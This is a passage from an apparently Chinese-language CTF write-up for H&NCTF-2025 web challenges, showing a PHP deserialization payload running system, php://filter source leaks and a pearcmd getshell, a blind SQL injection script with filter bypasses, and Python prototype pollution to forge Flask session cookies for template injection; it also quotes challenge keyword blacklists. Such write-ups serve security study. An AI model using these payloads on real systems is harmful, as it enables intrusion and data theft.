= <span class="variable">$db</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$ggg</span>,<span class="number">0</span>));</span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:6:&quot;GOGOGO&quot;:1:&#123;s:8:&quot;dengchao&quot;;O:6:&quot;DouBao&quot;:3:&#123;s:3:&quot;dao&quot;;a:2:&#123;i:0;O:8:&quot;HeiCaFei&quot;:1:&#123;s:9:&quot;HongCaFei&quot;;s:6:&quot;system&quot;;&#125;i:1;s:2:&quot;ls&quot;;&#125;s:9:&quot;Dagongren&quot;;a:1:&#123;i:0;i:0;&#125;s:9:&quot;Bagongren&quot;;a:1:&#123;i:0;i:1;&#125;&#125;&#125;i:1;i:0;&#125;</span></span><br><span class="line"><span class="comment">// i:1 改为 i:0 可以对比末尾</span></span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:6:&quot;GOGOGO&quot;:1:&#123;s:8:&quot;dengchao&quot;;O:6:&quot;DouBao&quot;:3:&#123;s:3:&quot;dao&quot;;a:2:&#123;i:0;O:8:&quot;HeiCaFei&quot;:1:&#123;s:9:&quot;HongCaFei&quot;;s:6:&quot;system&quot;;&#125;i:1;s:2:&quot;ls&quot;;&#125;s:9:&quot;Dagongren&quot;;a:1:&#123;i:0;i:0;&#125;s:9:&quot;Bagongren&quot;;a:1:&#123;i:0;i:1;&#125;&#125;&#125;i:0;i:0;&#125;</span></span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250616091939331.png" class="" title="image-20250616091939331"><p>接着执行ls &#x2F;；直接拿flag即可。</p><img src="/CTFwp/H&NCTF-2025/image-20250616092035545.png" class="" title="image-20250616092035545"><img src="/CTFwp/H&NCTF-2025/image-20250616092144991.png" class="" title="image-20250616092144991"><h2 id="DeceptiFlag"><a href="#DeceptiFlag" class="headerlink" title="DeceptiFlag"></a>DeceptiFlag</h2><img src="/CTFwp/H&NCTF-2025/image-20250616094822161.png" class="" title="image-20250616094822161"><p>删除后，输入xiyangyang和huitailang。</p><img src="/CTFwp/H&NCTF-2025/image-20250616094943838.png" class="" title="image-20250616094943838"><p>有文件包含漏洞。</p><p>我们试着泄露一下源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://27.25.151.198:38693/tips.php?file=php://filter/convert.base64-encode/resource=tips.php</span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250616095245341.png" class="" title="image-20250616095245341"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为 PHP 7 添加 str_starts_with 函数兼容支持</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;str_starts_with&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str_starts_with</span>(<span class="params"><span class="variable">$haystack</span>, <span class="variable">$needle</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$haystack</span>, <span class="variable">$needle</span>) === <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;verified&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;verified&#x27;</span>] !== <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: aicuo.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?file=flag&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); <span class="comment">// 去除首尾的空白字符</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\s/&#x27;</span>, <span class="variable">$file</span>)) &#123;  <span class="comment">// \s 表示任意空白字符 不能包含空白字符</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Trying to use space huh?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\./&#x27;</span>, <span class="variable">$file</span>)) &#123; <span class="comment">// 不能包含../</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Trying to include files from parent directory huh?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\//&#x27;</span>, <span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">str_starts_with</span>(<span class="variable">$file</span>, <span class="string">&#x27;php://filter&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Trying to include files from root directory huh?&#x27;</span>);</span><br><span class="line">&#125; <span class="comment">// 以/开头，不以php://filter开头，die</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">str_starts_with</span>(<span class="variable">$file</span>, <span class="string">&#x27;php://filter&#x27;</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$content</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;无法读取文件&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$content</span>; <span class="comment">// 这就是为啥我们可以通过php://filter得到源码</span></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 当是我试php://filter，看到无法读取文件，以为被过滤了，后面就想如何绕过.php后缀了，反正没做出来。</span></span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250616100536193.png" class="" title="image-20250616100536193"><p>base64解码：<code>/var/flag/flag.txt</code></p><img src="/CTFwp/H&NCTF-2025/image-20250616100721908.png" class="" title="image-20250616100721908"><p>还有一种非预期的做法：</p><p>通过包含pearcmd进行getshell。</p><img src="/CTFwp/H&NCTF-2025/image-20250616191035585.png" class="" title="image-20250616191035585"><p>进行命令执行：</p><img src="/CTFwp/H&NCTF-2025/image-20250616191223647.png" class="" title="image-20250616191223647"><h2 id="半成品login"><a href="#半成品login" class="headerlink" title="半成品login"></a>半成品login</h2><p>弱口令密码爆破：admin123</p><img src="/CTFwp/H&NCTF-2025/image-20250616105636001.png" class="" title="image-20250616105636001"><p>告诉我们两点：flag放在<code>hacker*****</code>用户下。数据都是小写。</p><p>寻找注入点：</p><ol><li>username 这里无论怎么尝试，返回结果：用户名只能为字母或数字。</li><li>password <code>输入admin123&#39;，返回结果：密码包含非法字符，说明&#39;被过滤了；输入admin123%2527,返回结果：系统错误;出现报错，说明闭合方式就是&#39;。</code></li></ol><p>注入点在password。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=admin123%2527#</span><br><span class="line"><span class="comment"># 返回结果登录成功</span></span><br><span class="line">username=admin&amp;password=admin123%2527or#</span><br><span class="line"><span class="comment"># 包含非法字符</span></span><br><span class="line"><span class="comment"># or也被过滤了 通过逻辑运算符||替换</span></span><br><span class="line">username=admin&amp;password=admin123%2527||1#</span><br><span class="line"><span class="comment"># 登录成功</span></span><br><span class="line"><span class="comment"># 此题主要考察的是mysql8的新特性注入</span></span><br><span class="line">username=admin&amp;password=admin123%2527||@@version like %25278.%%2527#</span><br><span class="line"><span class="comment"># 返回结果 包含非法字符，最后经测试发现过滤了空格，/**/并没有过滤，通过/**/代替。</span></span><br><span class="line">username=admin&amp;password=admin123%2527||@@version/**/like/**/%25278.%%2527#</span><br><span class="line"><span class="comment"># 登录成功 ， 说明版本确实大于8。</span></span><br><span class="line">username=admin&amp;password=admin123%2527/**/order/**/by/**/4#</span><br><span class="line"><span class="comment"># 登录成功</span></span><br><span class="line">username=admin&amp;password=admin123%2527/**/order/**/by/**/5#</span><br><span class="line"><span class="comment"># 系统错误</span></span><br><span class="line"><span class="comment"># 说明只有4列</span></span><br></pre></td></tr></table></figure><p>由于select也被过滤了，所以我们可以利用mysql8新增加了一个特性，table和select的功能有些类似，由于我们不知道表名，可以通过mysql的sys.schema_tables_with_full_table_scans性能视图获得。</p><p>我是搬运工大王：搬运来的内容如下图</p><img src="/CTFwp/H&NCTF-2025/image-20250616113630027.png" class="" title="image-20250616113630027"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">char = string.digits + string.ascii_lowercase + <span class="string">&#x27;~&#x27;</span> <span class="comment"># 确保字符的ascii 从小到大</span></span><br><span class="line">result_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://27.25.151.198:40849/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(char)):</span><br><span class="line">        <span class="comment"># payload = &#x27;1%27||((%27hnctfweb%27,%27hnctfuser%27,%27%27,%27%27)&lt;=(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1))#&#x27;.format(result_data+char[i]) #table sys.schema_tables_with_full_table_scans 为 4 列</span></span><br><span class="line">        <span class="comment"># payload = &#x27;1%27||((%271%27,%27admin%27,%27admin123%27,%27%27)&lt;=(table/**/hnctfuser/**/limit/**/1))#&#x27;.format(result_data+char[i]) # order by 测试为4列</span></span><br><span class="line">        payload = <span class="string">&#x27;1%27||((%272%27,%27hacker3wkfv%27,%27&#123;&#125;%27,%27%27)&lt;=(table/**/hnctfuser/**/limit/**/1/**/offset/**/1))#&#x27;</span>.<span class="built_in">format</span>(result_data+char[i]) <span class="comment">#d8578edf845</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;登录成功&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;错误&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">if</span> char[i-<span class="number">1</span>] == <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;~已结束~&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            result_data += char[i-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;result:&#x27;</span>+result_data)</span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250616172747533.png" class="" title="image-20250616172747533"><p>我们可以看到sys.schema_tables_with_full_table_scans为4列，用爆破出来的密码访问就可以。</p><img src="/CTFwp/H&NCTF-2025/image-20250616114531179.png" class="" title="image-20250616114531179"><h2 id="奇怪的咖啡店"><a href="#奇怪的咖啡店" class="headerlink" title="奇怪的咖啡店"></a>奇怪的咖啡店</h2><p>坑：抓本地包的时候，无法抓包，原因：</p><img src="/CTFwp/H&NCTF-2025/image-20250624165636989.png" class="" title="image-20250624165636989"><p>将忽略域名&#x2F;主机名设置为&lt;-loopback&gt;；强制让谷歌浏览器代理本地回环。</p><p>看题：</p><p>&#x2F;add路由</p><img src="/CTFwp/H&NCTF-2025/image-20250624170053040.png" class="" title="image-20250624170053040"><p>request.data主要接受的是json格式的数据，在发包的时候，修改发包方式为：Content-Type: application&#x2F;json。</p><p>存在merge合并函数，说明这里存在python的原型链污染；json_data是我们可控的；先通过原型链污染泄露源码。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;_static_folder&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;./&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到在json.loads前，调用了一个check函数，经过测试发现过滤了，<code>globals、app、/</code>。</p><p>python的json模块根据json的规范设计，它会自动检测并解析Unicode转义序列(example:\uxxxx)，将其转换为相应的Unicode字符。</p><p>这里我们可以通过unicode编码，绕过检测：</p><img src="/CTFwp/H&NCTF-2025/image-20250624171310185.png" class="" title="image-20250624171310185"><img src="/CTFwp/H&NCTF-2025/image-20250624171339219.png" class="" title="image-20250624171339219"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">raw_data, forbidden_keywords=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    检查原始数据中是否包含禁止的关键词</span></span><br><span class="line"><span class="string">    如果包含禁止关键词返回 True，否则返回 False</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 设置默认禁止关键词</span></span><br><span class="line">    <span class="keyword">if</span> forbidden_keywords <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        forbidden_keywords = [<span class="string">&quot;app&quot;</span>, <span class="string">&quot;config&quot;</span>, <span class="string">&quot;init&quot;</span>, <span class="string">&quot;globals&quot;</span>, <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;SECRET&quot;</span>, <span class="string">&quot;pardir&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;subclasses&quot;</span>, <span class="string">&quot;builtins&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查是否包含任何禁止关键词</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> raw_data <span class="keyword">for</span> keyword <span class="keyword">in</span> forbidden_keywords)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param_black_list = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;%1c&#x27;</span>, <span class="string">&#x27;%1d&#x27;</span>, <span class="string">&#x27;%1f&#x27;</span>, <span class="string">&#x27;%1e&#x27;</span>, <span class="string">&#x27;%20&#x27;</span>, <span class="string">&#x27;%2b&#x27;</span>, <span class="string">&#x27;%2c&#x27;</span>, <span class="string">&#x27;%3c&#x27;</span>, <span class="string">&#x27;%3e&#x27;</span>, <span class="string">&#x27;%c&#x27;</span>, <span class="string">&#x27;%2f&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;b64decode&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;encode&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>,  <span class="string">&#x27;flag&#x27;</span>,  <span class="string">&#x27;set&#x27;</span>,  <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;file&#x27;</span>,  <span class="string">&#x27;pop(&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;setdefault&#x27;</span>, <span class="string">&#x27;char&#x27;</span>, <span class="string">&#x27;lipsum&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;endfor&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;=&#x27;</span> ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增强WAF防护</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf_check</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="comment"># 检查是否有不合法的字符</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> param_black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> value:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否是自动化工具请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_automated_request</span>():</span><br><span class="line">    user_agent = request.headers.get(<span class="string">&#x27;User-Agent&#x27;</span>, <span class="string">&#x27;&#x27;</span>).lower()</span><br><span class="line">    <span class="comment"># 如果是常见的自动化工具的 User-Agent，返回 True</span></span><br><span class="line">    automated_agents = [<span class="string">&#x27;fenjing&#x27;</span>, <span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;bot&#x27;</span>, <span class="string">&#x27;spider&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(agent <span class="keyword">in</span> user_agent <span class="keyword">for</span> agent <span class="keyword">in</span> automated_agents)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check1</span>(<span class="params">value</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_automated_request():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Automated tool detected&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用WAF机制检查请求的合法性</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> waf_check(value):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>这些就是后面没有的代码。</p><img src="/CTFwp/H&NCTF-2025/image-20250624171552756.png" class="" title="image-20250624171552756"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">original_template = <span class="string">&#x27;Hello admin!!!Your permissions are&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(permission)</span><br></pre></td></tr></table></figure><p>这里存在模板注入漏洞；但是要求name必须为admin，且permission不能为0，所以我们还要污染密钥了。</p><img src="/CTFwp/H&NCTF-2025/image-20250624171953531.png" class="" title="image-20250624171953531"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;config&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;SECRET_KEY&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// config app globals SECRET 都被过滤了 unicode编码</span></span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250624172427557.png" class="" title="image-20250624172427557"><p>将密钥污染为1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;1&quot; -t &quot;&#123;&#x27;name&#x27;:&#x27;admin&#x27;,&#x27;permission&#x27;:&#x27;&#123;&#123;().__class__.__base__.__subclasses__()&#125;&#125;&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">array = <span class="string">&quot;[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class 